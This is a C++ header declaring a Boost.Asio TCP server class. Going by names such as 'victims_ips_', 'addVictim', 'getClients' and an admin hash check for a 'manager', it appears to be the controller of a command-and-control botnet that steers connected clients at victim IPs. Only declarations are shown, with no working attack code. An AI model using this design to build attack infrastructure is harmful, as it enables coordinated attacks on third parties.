#ifndef SERVER_H
#define SERVER_H

#define INACTIVITY_TIMEOUT 1 * 1000000  // 1sec
#include <unistd.h>

#include <algorithm>
#include <boost/asio.hpp>
#include <boost/asio/io_context.hpp>
#include <boost/bind/bind.hpp>
#include <chrono>
#include <cstdint>
#include <future>
#include <iostream>
#include <memory>
#include <mutex>
#include <optional>
#include <unordered_map>

#include "msg_parser.h"
#include "session.h"

namespace io = boost::asio;
using tcp = io::ip::tcp;
using err = boost::system::error_code;
class server {
    public:
	server(io::io_context &, std::uint16_t);
	void start();

    private:
	void accept();
	void onAccept(err error_code);

	void handleResponse(std::string &, session *);
	void handleAlive(std::string &, std::vector<std::string> &, session *);
	void initManager(std::string &, std::vector<std::string> &params, session *client);
	void getClients(std::string &, std::vector<std::string> &params, session *client);
	void getVictims(std::string &, std::vector<std::string> &params, session *client);
	void addVictim(std::string &, std::vector<std::string> &params, session *client);
	void removeVictim(std::string &, std::vector<std::string> &params, session *client);
	void removeClient(std::string &, std::vector<std::string> &params, session *client);

	void sendAllClients(std::string const &);
	void pingClients();

	long int generateId();
	bool checkHash(std::string &);

	std::future<void> routine_future_;

	// Accepting new clients
	io::io_context &io_context_;
	tcp::acceptor acceptor_;
	std::optional<tcp::socket> socket_;

	// Clients handling
	std::unordered_map<long int, std::shared_ptr<session>> clients_sessions_container_;
	std::mutex clients_m_;
	msg_parser msg_parser_;
	std::unordered_map<std::string, std::function<void(std::string&, std::vector<std::string> &, session *)>>
	    command_handlers_;

	// Manager handling
	size_t admin_hash_ = 0;
	std::vector<std::string> victims_ips_;
	std::mutex victims_m_;
};

#endif	// SERVER_H